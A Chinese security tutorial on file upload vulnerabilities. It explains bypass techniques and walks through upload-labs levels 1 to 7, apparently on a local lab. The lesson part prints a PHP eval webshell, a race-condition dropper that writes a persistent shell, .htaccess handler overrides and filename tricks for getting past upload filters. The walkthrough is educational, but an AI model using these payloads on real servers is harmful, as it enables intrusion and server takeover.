---
title: 文件上传漏洞
date: 2026-06-08 13:00:00
categories:
  - Web安全
  - 文件上传
tags:
  - 文件上传
description: 文件上传漏洞的检测方法、前端/后端绕过技巧、WAF对抗与安全防御配置
---

# 一、文件上传漏洞基础
## 1. 概念与危害
+ **概念**：服务器未对上传文件严格验证、过滤，攻击者可上传恶意脚本文件，控制网站甚至服务器。
+ **核心危害**：上传Web木马并被服务器解析，获取网站权限、读取/修改文件、控制服务器。

## 2. 高危触发点
+ 头像、相册上传
+ 视频、图片分享
+ 论坛/邮箱附件上传
+ 文件管理器
+ 移动端同类上传功能

## 3. 基础实操
1. 普通上传：上传图片至`up/`目录，访问路径`http://127.0.0.1/up/xxx.jpg`。
2. 恶意上传1（phpinfo）：
    - 文件名：`1.php`
    - 代码：`<?php phpinfo(); ?>`
    - 访问：`http://localhost/up/1.php`，泄露服务器信息。
3. 恶意上传2（一句话木马）：
    - 文件名：`2.php`
    - 代码：`<?php @eval($_POST[cmd]); ?>`
    - 访问：POST传参`cmd=phpinfo();`，执行任意代码。

## 4. 一句话木马解析
+ `@`：抑制错误，保证代码执行。
+ `eval()`：将字符串当作PHP代码执行。
+ `$_POST[cmd]`：接收POST请求中`cmd`参数的命令并执行。

## 5. 蚁剑连接一句话木马
+ URL：`http://localhost/up/2.php`
+ 连接密码：`cmd`
+ 效果：获取服务器目录权限，可编辑、删除文件，执行系统命令。

---

# 二、文件上传检测绕过
## 1. JS前端验证绕过
+ **原理**：网站仅在浏览器端使用 JavaScript 检查文件后缀（例如：`allowSubmit()` 函数限制只能上传 `.jpg`/`.png`）。
+ **绕过方法**：
    - 方法一：
        1. 保存网页到本地。
        2. 删除/修改JS校验代码。
        3. 用修改后的页面上传PHP文件。
    - 方法二：
        1. 直接在浏览器中禁用 JavaScript。
        2. 把木马文件先改名为 `.jpg`，通过验证后，用抓包工具（如 Burp Suite）拦截请求，在 HTTP 请求体中把文件名改回 `.php`。

## 2. MIME类型验证绕过
+ **原理**：后端代码通过检查 HTTP 请求头中的 `Content-Type` 字段来判断文件类型（例如要求必须是 `image/jpeg`）。
+ **绕过方法**：BurpSuite抓包，修改`Content-Type`为图片类型。

## 3. 黑名单后缀绕过
+ **原理**：后端设置了一个“不允许上传的文件后缀”列表（如禁止 `.php`, `.asp`）。如果遇到粗心的管理员，黑名单可能会漏掉一些同样能被解析的替代后缀。
+ **绕过方法**：尝试使用黑名单之外但可能被服务器解析的后缀。
    - **PHP 环境**：`.php3`, `.php4`, `.php5`, `.phtml`, `.phtm`
    - **ASP 环境**：`.asa`, `.cer`, `.cdx`
    - **JSP 环境**：`.jspx`, `.jsv`, `.jsw`

## 4. .htaccess绕过
+ **原理：**在 Apache 服务器中，`.htaccess` 是一个局部的分布式配置文件。如果该文件可上传且能生效，攻击者可以自定义服务器的解析规则。
+ **绕过方法**：

```plain
<FilesMatch "2.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

    1. 上传`.htaccess`文件，内容：
    2. 上传名为`loudong.jpg`的PHP木马，自动解析为PHP。

## 5. 大小写绕过
+ **原理**：后端在写黑名单校验时，忘记使用类似 `strtolower()` 的函数将文件名统一转为小写。
+ **绕过方法**：文件名改为`info.PHP`/`info.PhP`。

## 6. 末尾空格绕过
+ **原理**：代码在黑名单对比时，没有对文件名进行去空格处理（未调用 `trim()` 函数）。
+ **绕过方法**：Burp修改文件名为`info.php `（末尾加空格）。

## 7. 末尾点绕过
+ **原理**：代码在黑名单对比时，没有循环利用 `deldot()` 去除文件名末尾的点。
+ **绕过方法**：Burp修改文件名为`info.php.`。

## 8. Windows ::$DATA绕过
+ **原理**：在 Windows 的 NTFS 文件系统中，包含一种称为NTFS 交换数据流（ADS）的特性。任何文件在后面加上 `::$DATA` 都会被当做文件流处理，而不会改变文件本身的属性。
+ **绕过方法**：抓包修改文件名为 `webshell.php::$DATA`。后端的黑名单通常无法匹配这种后缀而放行，但 Windows 在写入磁盘时，会把 `::$DATA` 之后的内容去掉，最终安全落地为 `webshell.php`。

## 9. 点+空格绕过
+ **原理**：这是由于后端代码逻辑漏洞导致的复合绕过。例如代码只利用 `deldot()` 或 `trim()` 处理了一次，由于顺序问题，没有清理干净。`deldot`函数仅从末尾删点，遇空格停止。
+ **绕过方法**：文件名改为`info.php. .`（点+空格+点）。

## 10. 双写后缀绕过
+ **原理**：后端采用了“黑名单替换”的防御策略，即发现敏感后缀（如 `php`）就直接将其替换为空字符串（`str_replace('php', '', $filename)`），但由于只替换了一次，引发了漏洞。
+ **绕过方法**：文件名改为`info.pphphp`（替换后变为`info.php`）。

## 11. 0x00 截断绕过
+ **原理**：在底层 C/C++ 语言中，`0x00`（十六进制的 `00`，即 URL 编码的 `%00`）被视为字符串的结束标识符。当 PHP 版本 `< 5.3.4` 且 `magic_quotes_gpc = Off` 时，如果在拼接文件保存路径时注入了 `0x00`，底层函数在读取到 `0x00` 时会认为路径已结束，从而截断后面的合法后缀。
+ **绕过方法**：
    - **GET 传参**：如果上传路径拼接在 URL 中，直接在路径后加上 `%00`。例如 `save_path=../upload/shell.php%00`。
    - **POST 传参**：如果路径拼接在 HTTP 请求体（Body）中，由于 POST 不会自动 URL 解码，需要在 Burp Suite 中输入一个占位符（如 `shell.php+`），然后在 Hex（十六进制）视图中，将 `+` 对应的十六进制值（`2b`）修改为 `00`。

## 12. 图片马 + 文件包含绕过
+ **原理**：后端不再只校验后缀，而是深入检查文件内容。例如读取文件头部前几个字节（Magic Bytes）来判断是否为真实图片，或者调用 `getimagesize()`、`exif_imagetype()` 函数验证图片合法性。
+ **绕过方法**：
    1. 制作图片马：在 Windows 命令行下，使用命令 `copy 原图.png /b + 木马.php /a 生成图.png`，将恶意代码隐藏在合法图片数据的尾部。
    2. 上传成功后，该文件在服务器端依然是一张图片，无法直接解析。
    3. **必须配合文件包含漏洞**（如服务器存在 `include($_GET['file'])` 逻辑），将上传的图片路径传入包含函数中，强制服务器按 PHP 语法解析该图片，从而触发木马。

## 13. 二次渲染绕过
+ **原理**：服务器不仅验证图片，还调用了图形处理库（如 PHP 的 GD 库）对用户上传的图片进行缩放、裁剪或重新渲染，并保存为一张全新的图片。这会导致附加在图片尾部的恶意代码被当作“无用数据”丢弃。GIF 最高支持256种颜色。由于这种特性，重新渲染改动不会太多！
+ **绕过方法**：
1. 优先选择 **GIF** 格式（因其数据块结构更容易被利用）。
2. 上传一张正常的 GIF，然后从服务器下载被渲染后的 GIF。
3. 使用十六进制编辑器（如 010 Editor）对比原图和渲染后的图，找到**数据完全没有发生改变的区域**（Data Sub-blocks）。
4. 将 PHP 一句话木马插入到这些不发生变化的区域，重新上传即可。

## 14. 条件竞争绕过
+ **原理**：后端代码存在逻辑时间差（TOCTOU 漏洞）。服务器的流程是：**先将文件移动到上传目录 -> 然后判断是否合法 -> 若不合法则调用 `unlink()` 删除文件**。在”判断并删除”的这段极短时间里，文件是真实存在于服务器上的。
+ **绕过方法**：
1. 准备一个能生成新文件的木马（例如：`<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"]);?>');?>`）。
2. 使用抓包工具（如 Burp Suite 的 Intruder）开启大线程，**疯狂且持续地上传**该木马。
3. 同时开启另一个工具，**疯狂且持续地请求访问**该木马的 URL。
4. 只要在服务器删除它的瞬间之前，有一次 HTTP 请求成功访问到了该文件，木马就会执行，并在服务器上生成一个新的、永远不会被删除的 `shell.php`。

## 15. 白名单 + 数组绕过
+ **原理**：开发者允许用户以数组形式（如 `save_name[]`）提交文件名，并在后端根据数组索引来拼接最终的文件名。如果代码逻辑中使用了 `count()` 函数获取数组长度，但拼接时却写死了索引（如 `$save_name[0] . '.' . $save_name[count-1]`），就会产生逻辑漏洞。
+ **绕过方法**：抓包修改请求，构造一个不连续的数组：`save_name[0]=shell.php`，`save_name[2]=jpg`。此时数组长度 `count` 为 2。拼接时取 `$save_name[0]` (shell.php) 和 `$save_name[1]` (由于跳过了1，为空)，最终保存的文件名变成了 `shell.php.`，利用 Windows 特性去除末尾点，落地为 PHP。



## 16. 中间件解析漏洞原理与绕过
+ **IIS 6.0 解析漏洞**：
+ **目录解析原理**：IIS 会将以 `.asp` 命名的文件夹（如 `/test.asp/`）下的所有文件都当成 ASP 脚本解析。
+ **绕过方法**：如果可以控制上传目录名，建立 `.asp` 目录，将图片马传进去即可执行。
+ **分号解析原理**：IIS 在解析文件名时，遇到 `;` 会将其后面的内容截断。
+ **绕过方法**：上传名为 `shell.asp;.jpg` 的文件，过白名单是 `.jpg`，但 IIS 会当做 `shell.asp` 解析。
+ **Apache 多后缀解析漏洞**：
+ **原理**：Apache 的解析规则是**从右向左**。遇到不认识的后缀，会继续往左读取，直到遇到认识的为止。
+ **绕过方法**：上传名为 `shell.php.a.b.c` 的文件。Apache 不认识 `.c`, `.b`, `.a`，最终会识别到 `.php` 并执行。
+ **Nginx 解析漏洞 (CGI-PHP)**：
+ **原理**：当 PHP 的 `cgi.fix_pathinfo=1` 时开启。Nginx 遇到请求 `shell.jpg/.php` 时，找不到该文件，会将路径交给 PHP 处理。PHP 会向上解析，发现 `shell.jpg` 存在，就把它当成 PHP 执行了。
+ **绕过方法**：上传正常的图片马 `shell.jpg`。然后在浏览器中访问 `http://xxx/shell.jpg/.php`，即可触发执行。

---

# 三、案例分析
## 练习靶场：
[https://github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)

上传的文件用到的一句话木马都是：

```php
<?php
  phpinfo();
?>
```

## Pass-01-**前端校验**
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780616350213-bd5f102f-44bd-457e-b42a-e35e87763e36.png)

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

### 2、解题思路
1. 分析代码

 **前端 JavaScript 校验**

### 3、操作
1. 如果直接上传 1.php 发现有前端校验，无法被抓包。所以就只能先用允许上传的后缀绕过，再抓包修改后缀

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780616695859-c2bfe08f-18fb-4738-961c-db891ba39227.png)

2. 重新上传 1.png，再修改为 1.php

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780616818088-2f633fbc-4aed-4413-9a70-938d0b5f8209.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780616852684-cf15b20e-7662-4a4d-94d6-8aeccc0649cb.png)

3. 放行

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780635176178-87c54bc8-4d52-496b-94aa-066e7ffafda5.png)

4. 访问

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780616926523-ef7c43c6-97b8-43fb-b37b-b96cbf155bc4.png)

## Pass-02-MIME 欺骗 
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780635205793-67b8354c-95fa-4533-8770-b125b72b0b3d.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780635351575-f80d83fb-9472-4f03-b8bb-613cf4108682.png)

 MIME 欺骗  

### 3、操作
1. 上传 1.php 文件，再用 bp 抓包

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780635471108-2554874e-468a-43ba-bc18-c824be2767cc.png)

2. 修改 Content-Type 里的内容，绕过校验。可以改成 image/gif、image/jpeg、image/png。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780635697668-a6cd0219-5b40-41e6-bfbd-e99ba48212c3.png)

3. 放行

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780637437966-9ef9f0c0-ea0e-4631-8ab0-4898f96f79b6.png)

4. 访问：

```php
http://127.0.0.1/upload/1.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780635846605-7bead0c6-5374-4e01-9c2a-1552e6d0d184.png)

## Pass-03-phtml
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780659912787-f95fe807-eca7-43ae-92b2-032dcecec683.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780660042880-a1c3b909-50e1-440d-ba27-25bcf6d9d95b.png)

+ `deldot()` 删掉末尾的点
+ `strrchr()` 截取最后一个点后面的后缀
+ `strtolower()` 强制转小写
+ `str_ireplace('::$DATA', ...)` 擦除 Windows 的 NTFS 流特征
+ `trim()` 首尾去空格

 apache服务器能够使⽤php解析.phtml.php5， 使用 `.phtml` 或 `.php5` 后缀  

但是这关不可以用`1.php. . ` 因为代码强制重命名，使用了时间戳 `date()` 保存。上传`1.php. . ` 后又抓到这个包

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780662006599-ae1cb782-ad87-42e1-8429-7d3155aece48.png)

这就是我们上传的`1.php. . ` ，被改名了

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780662056802-dcc70357-c3e6-4f04-a0ca-87ca8d972811.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780662096588-6022e3e7-ca3a-4fba-b76e-9db97080919e.png)

复制地址访问：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780662140267-8c2f956a-9afb-438e-91a3-42df4badc5d7.png)

也不可以传 `.htaccess` 配置文件 ，虽然`.htaccess` 不在它的黑名单（`.asp`, `.aspx`, `.php`, `.jsp`）里，但是会被重命名， Apache 服务器它只认名字确切为 `.htaccess` 的文件。

### 3、操作
1. 先明确服务器是 Apache 服务器  

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780661260824-6406ff27-c585-486a-9f56-8c948403d5d0.png)

2. 上传 phtml 为后缀的文件

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780661340242-e710e71d-893c-4ff9-97b8-6a046ac6ca5b.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780661364441-0dd4aa50-ca11-41e2-85eb-d0b403c900fd.png)

3. 访问

```php
http://127.0.0.1/upload/202606052009002725.phtml
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780661398454-7d36f88b-d02a-4be0-8445-25b59dec87e7.png)

## Pass-04-`.htaccess`配置文件
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780635981581-7eec3859-402b-410a-93f4-f19100de7ea2.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析源代码

```php
".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"
```

黑名单里不存在`.htaccess`

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780636783751-0837301b-1f8d-4a33-aa86-4d8c97276982.png)

+ `deldot()` 删掉末尾的点
+ `strrchr()` 截取最后一个点后面的后缀
+ `strtolower()` 强制转小写
+ `str_ireplace('::$DATA', ...)` 擦除 Windows 的 NTFS 流特征
+ `trim()` 首尾去空格

可以上传一个`1.php. . ` (点 + 空格 + 点 + 空格)  

末尾只有一个空格，绕过了 deldot() 函数的操作,`$file_name` 依然是：`1.php. . `；

`strrchr()` 截取后缀，从右往左找最后一个点，截取了 `. ` （一个点 + 一个空格）, 新变量 `$file_ext` = `. `

`trim()` 它把 `$file_ext` 里的那个空格削掉了。 此时 `$file_ext` 变成了 `.` （只有一个点）。  

 代码拿 `.` 去对比黑名单，发现不在里面。绕过校验！

### 3、操作
#### 方法一：`.htaccess`配置文件
条件：服务器是 apache、

知识补充：

在 Apache 环境下，`.htaccess`写入内容：

```plain
AddType application/x-httpd-php .jpg
```

+ **核心原理**：`AddType` 指令用于在给定的文件扩展名与特定的内容类型（MIME type）之间建立映射。这行内容直接命令 Apache：“从现在开始，只要在这个目录下看到以 `.jpg` 结尾的文件，不需要管它的二进制内容，统统把它当做 `application/x-httpd-php`（即 PHP 脚本）交给 PHP 引擎去解析执行。”

```plain
<FilesMatch "webshell.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

+ **核心原理**：`<FilesMatch>` 使用正则表达式来匹配文件名，而 `SetHandler` 用于强制指定匹配文件的处理器。这行内容的意思是：“只有当当前目录下的文件名精确叫做 `webshell.jpg` 时，才激活 PHP 处理器去执行它。” 这种方式隐蔽性极高，不会影响该目录下其他正常图片的显示。
1. 先上传配置文件 
2. 再上传图片文件
3. 访问：

```plain
http://127.0.0.1/upload/loudong.jpg
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664389413-bafc86d7-5656-457e-8673-53e164d6243d.png)

#### 方法二：
1. 上传文件，bp 抓包

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780637328507-16208b49-d3dd-4ce0-87fc-285ff7afbf51.png)

2. 修改，放行

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780637347052-0bbaf9a3-244d-4407-81d9-2b2b7e71ac54.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780637433148-51e19082-66f7-4d38-a8b7-d1a2e2ed9640.png)

3. 访问

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780637397326-6ff75c37-65b8-4a9a-a42a-7197aed634bf.png)

## Pass-05-大写
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780663144866-ce8094d4-9c46-4089-86be-c7e2a7f86c71.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码

```php
".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"
```

`.htaccess`在黑名单中

不可以用`.htaccess`配置文件

但是我们发现这里没有大写转小写了，可以用`.htaccess`配置文件。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664076495-17427a94-7d13-465f-ab5c-e3836b29d8f3.png)

### 3、操作
1. 上传文件，抓包修改

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664186350-0c394a3e-6d21-45c2-b77d-c733c5c12cc7.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664299910-a0f2f1ac-ec34-4acc-9b0d-d89103a5e8ba.png)

2. 访问：

```plain
http://127.0.0.1/upload/202606052057142902.PHP
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664289069-c287c7dd-53ea-4fb4-b157-81c029314c25.png)

## Pass-06-空格
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664593836-f6fc258d-5696-4b0e-abf4-371437bffec6.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码

```php
".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"
```

无法用`.htaccess`配置文件

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664693592-677073a9-e2bf-4e6d-b8e1-99153a73a45c.png)

我们发现没有$file_ext = trim($file_ext); 首尾去空的函数。

所以可以在后缀后面加空格绕过黑名单的校验。

### 3、操作
1. 上传文件，抓包，修改（加空格）

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664887347-e50480cb-9b58-42d6-bfa5-8b36c352df19.png)  
2. 访问：

```plain
http://127.0.0.1/upload/202606052108019520.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664940274-b631921b-be72-449a-81ad-a32f76ebb0e5.png)

## Pass-07- 点
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780664969888-53d170a4-8a4d-4d20-9fa3-51189da1fa31.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码

```php
".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780665039403-4f525559-baf4-4941-a8f3-7f0881ae2772.png)

我们发现没有$file_name = deldot($file_name); 删除文件名末尾的点的这个函数了，于是可以再后缀后面加 . 绕过

### 3、操作
1. 上传文件，抓包，修改（加  .  ）

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780665129476-a877c0d7-8efd-4f50-8fa3-b500334f47d5.png)

2. 访问：

```plain
http://127.0.0.1/upload/1.php.
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780665223015-a8a9f5ef-41de-4304-b670-6feedcbc20e7.png)

## Pass-08-"::$DATA
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
